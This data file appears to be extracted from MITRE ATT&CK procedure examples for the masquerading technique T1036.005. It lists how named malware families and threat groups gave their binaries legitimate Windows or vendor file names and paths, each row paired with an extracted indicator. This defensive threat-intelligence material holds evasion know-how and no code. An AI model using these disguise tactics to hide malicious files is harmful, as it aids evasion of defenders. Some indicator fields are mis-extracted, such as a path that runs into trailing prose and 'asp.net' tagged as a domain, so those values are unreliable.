T1036.005,Match Legitimate Name or Location,Pysa  has executed a malicious executable by naming it svchost.exe.   [126],Procedure Examples,file,svchost.exe
T1036.005,Match Legitimate Name or Location,"RainyDay  has used names to mimic legitimate software including ""vmtoolsd.exe"" to spoof Vmtools.   [100]",Procedure Examples,file,vmtoolsd.exe
T1036.005,Match Legitimate Name or Location,RDAT  has masqueraded as VMware.exe.   [132],Procedure Examples,file,VMware.exe
T1036.005,Match Legitimate Name or Location,"Ryuk  has constructed legitimate appearing installation folder paths by calling  GetWindowsDirectoryW  and then inserting a null byte at the fourth character of the path. For Windows Vista or higher, the path would appear as  C:\Users\Public .   [137]",Procedure Examples,path,C:\Users\Public
T1036.005,Match Legitimate Name or Location,"S-Type  may save itself as a file named  msdtc.exe , which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.   [94]      [95]",Procedure Examples,file,msdtc.exe
T1036.005,Match Legitimate Name or Location,Sandworm Team  has avoided detection by naming a malicious binary explorer.exe.   [139]      [140],Procedure Examples,file,explorer.exe
T1036.005,Match Legitimate Name or Location,"ShimRatReporter  spoofed itself as  AlphaZawgyl_font.exe , a specialized Unicode font.   [141]",Procedure Examples,file,AlphaZawgyl_font.exe
T1036.005,Match Legitimate Name or Location,Sibot  has downloaded a DLL to the  C:\windows\system32\drivers\  folder and renamed it with a  .sys  extension.   [61],Procedure Examples,path,C:\windows\system32\drivers\  folder and renamed it with a  .sys
T1036.005,Match Legitimate Name or Location,Sibot  has downloaded a DLL to the  C:\windows\system32\drivers\  folder and renamed it with a  .sys  extension.   [61],Procedure Examples,path,C:\windows\system32\drivers
T1036.005,Match Legitimate Name or Location,"SideCopy  has used a legitimate DLL file name,  Duser.dll  to disguise a malicious remote access tool.   [142]",Procedure Examples,file,Duser.dll
T1036.005,Match Legitimate Name or Location,Sidewinder  has named malicious files  rekeywiz.exe  to match the name of a legitimate Windows executable.   [143],Procedure Examples,file,rekeywiz.exe
T1036.005,Match Legitimate Name or Location,"Silence  has named its backdoor ""WINWORD.exe"".   [144]",Procedure Examples,file,WINWORD.exe
T1036.005,Match Legitimate Name or Location,"SLOTHFULMEDIA  has mimicked the names of known executables, such as mediaplayer.exe.   [146]",Procedure Examples,file,mediaplayer.exe
T1036.005,Match Legitimate Name or Location,"Sowbug  named its tools to masquerade as Windows or Adobe Reader software, such as by using the file name adobecms.exe and the directory  CSIDL_APPDATA\microsoft\security .   [148]",Procedure Examples,file,adobecms.exe
T1036.005,Match Legitimate Name or Location,StrifeWater  has been named  calc.exe  to appear as a legitimate calculator program.   [150],Procedure Examples,file,calc.exe
T1036.005,Match Legitimate Name or Location,SUGARDUMP  has been named  CrashReporter.exe  to appear as a legitimate Mozilla executable.   [151],Procedure Examples,file,CrashReporter.exe
T1036.005,Match Legitimate Name or Location,SUNSPOT  was identified on disk with a filename of  taskhostsvc.exe  and it created an encrypted log file at  C:\Windows\Temp\vmware-vmdmp.log .   [152],Procedure Examples,path,C:\Windows\Temp\vmware-vmdmp.log
T1036.005,Match Legitimate Name or Location,SUNSPOT  was identified on disk with a filename of  taskhostsvc.exe  and it created an encrypted log file at  C:\Windows\Temp\vmware-vmdmp.log .   [152],Procedure Examples,file,taskhostsvc.exe
T1036.005,Match Legitimate Name or Location,"Tarrask  has masqueraded as executable files such as  winupdate.exe ,  date.exe , or  win.exe .   [155]",Procedure Examples,file,winupdate.exe
T1036.005,Match Legitimate Name or Location,"Tarrask  has masqueraded as executable files such as  winupdate.exe ,  date.exe , or  win.exe .   [155]",Procedure Examples,file,date.exe
T1036.005,Match Legitimate Name or Location,"Tarrask  has masqueraded as executable files such as  winupdate.exe ,  date.exe , or  win.exe .   [155]",Procedure Examples,file,win.exe
T1036.005,Match Legitimate Name or Location,TinyTurla  has been deployed as  w64time.dll  to appear legitimate.   [162],Procedure Examples,file,w64time.dll
T1036.005,Match Legitimate Name or Location,"A  Winnti for Windows  implant file was named ASPNET_FILTER.DLL, mimicking the legitimate ASP.NET ISAPI filter DLL with the same name.   [169]",Procedure Examples,domain,asp.net
